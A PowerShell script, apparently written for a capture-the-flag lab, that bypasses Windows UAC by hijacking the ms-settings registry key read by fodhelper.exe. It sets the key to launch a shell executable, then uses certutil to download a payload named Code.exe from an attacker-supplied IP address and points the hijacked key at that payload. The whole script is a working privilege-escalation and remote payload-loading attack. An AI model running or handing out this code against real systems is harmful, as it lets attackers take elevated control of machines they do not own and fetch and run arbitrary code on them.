# PowerShell Script for Registry Manipulation and Privilege Escalation Checks
# Updated: 10Sep23
#
# Requires: PowerShell 5.0+
# Author: DeMzDaRulez

# Enforce a minimum PowerShell version
#Requires -Version 5.0

# Function to check privilege level
function Check-Privilege {
    $whoamiOutput = whoami /groups
    $mandatoryLabel = $whoamiOutput -match "Mandatory Label"
    return $mandatoryLabel
}

# Declare variables
$fodhelper64Path = "C:\Windows\SysNative\fodhelper.exe"
$fodhelper32Path = "C:\Windows\System32\fodhelper.exe"
$registryPath = "HKCU\Software\Classes\ms-settings\Shell\Open\command"
$registryPathBkp = "HKCU\Software\Classes\.thm\Shell\Open\command"
$defaultCmd = "cmd /c start C:\Users\ted\shell.exe"
$backupFileName = ".\backup.exe"

# Check for fodhelper.exe (64-bit or 32-bit)
$fodhelper = ""
if (Test-Path $fodhelper64Path) {
    $fodhelper = $fodhelper64Path
} elseif (Test-Path $fodhelper32Path) {
    $fodhelper = $fodhelper32Path
} else {
    Write-Host "Neither 64-bit nor 32-bit fodhelper.exe found. Exiting."
    exit 1
}

# Run fodhelper
Start-Process $fodhelper

# Check initial privilege level
$mandatoryLabel = Check-Privilege
if ($mandatoryLabel -match "System") {
    Write-Host "You are System! Do it yourself"
    exit 1
} elseif ($mandatoryLabel -match "High") {
    $response = Read-Host "Are you aiming for System? (y/n)"
    if ($response -eq 'n') {
        Write-Host "You chose not to aim for System. Exiting."
        exit 1
    } else {
        Write-Host "Okay, but I'm not making any promises we are escalating to System!"
    }
} else {
    Write-Host "You need help with $mandatoryLabel so let's go!"
}

# Modify registry
New-Item $registryPath -Force
New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path $registryPath -Name "(default)" -Value $defaultCmd -Force

# Download Code.exe using CertUtil
$hostIP = Read-Host "Enter the IP address where you are serving the Code.exe payload via Port 80"
certutil -urlcache -split -f "http://$hostIP:80/Code.exe" $backupFileName

# Update registry for the backup file
Set-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path $registryPath -Name "(default)" -Value "$PWD$backupFileName" -Force

# Recheck privilege level
Start-Process $fodhelper
$mandatoryLabel = Check-Privilege
if (-Not ($mandatoryLabel -match "System") -And -Not ($mandatoryLabel -match "High")) {
    Write-Host "Sorry, something went wrong. Check your hosting, naming, payload, IPs, ports, and feel free to run this script manually for error management."
}
